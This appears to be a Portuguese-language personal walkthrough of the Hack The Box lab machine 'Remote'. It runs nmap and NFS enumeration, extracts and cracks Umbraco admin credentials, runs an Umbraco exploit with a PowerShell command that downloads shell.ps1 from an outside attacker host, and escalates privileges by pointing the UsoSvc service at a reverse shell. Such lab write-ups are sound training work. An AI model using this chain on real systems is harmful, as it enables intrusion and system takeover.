Remote
========================

    sudo nmap_enum remote.htb | tee nmap_output.txt

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn remote.htb | tee nmap_udp_output.txt
 
![qownnotes-media-mkHoMQ](../../../media/qownnotes-media-mkHoMQ.png)

NFS é o vetor


    showmount -e 10.10.10.180
    
![qownnotes-media-GtjzBF](../../../media/qownnotes-media-GtjzBF.png)
    
    sudo nmap -sS -p 111,2049 --script nfs-showmount,nfs-ls 10.10.10.180
    
 ![qownnotes-media-yRqJwy](../../../media/qownnotes-media-yRqJwy.png)

# Exploitation

    mkdir /tmp/mount
    sudo mount -t nfs 10.10.10.180:/site_backups /tmp/mount

![qownnotes-media-WkyOwe](../../../media/qownnotes-media-WkyOwe.png)


    strings App_Data/Umbraco.sdf | head

![qownnotes-media-YjPiqr](../../../media/qownnotes-media-YjPiqr.png)

 
 As credenciais são:
 
admin@htb.local
baconandcheese

    john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt

![qownnotes-media-Ioepkc](../../../media/qownnotes-media-Ioepkc.png)

![qownnotes-media-PsEXEN](../../../media/qownnotes-media-PsEXEN.png)

    searchsploit umbraco

![qownnotes-media-WOnfBI](../../../media/qownnotes-media-WOnfBI.png)


    cp /usr/share/exploitdb/exploits/aspx/webapps/49488.py exploit_temp.py

    python exploit_temp.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -a "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.8/shell.ps1')" -c powershell.exe

![qownnotes-media-zBdzOq](../../../media/qownnotes-media-zBdzOq.png)


# Privilege escalation

### PowerUp

Normalmente eu tenho problemas para importar o module de powershell powerup, então eu uso a seguinte alternativa:

    . ./PowerUp.ps1

caso contrário:

    import-module PowerUp.ps1

    invoke-allchecks
     
![qownnotes-media-jCADRm](../../../media/qownnotes-media-jCADRm.png)

### Weak service permissions

![qownnotes-media-Yhpwrk](../../../media/qownnotes-media-Yhpwrk.png)

    ./accesschk.exe -ucwqv UsoSvc /accepteula
    
    ./accesschk.exe -ucwqv <servicename> /accepteula
    
Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
    
    whoami /all

![qownnotes-media-zdSaRr](../../../media/qownnotes-media-zdSaRr.png)

    sc.exe config usosvc binpath="C:\temp\revshell.exe"

![qownnotes-media-QfiKZv](../../../media/qownnotes-media-QfiKZv.png)

    net stop usosvc
    net start usosvc'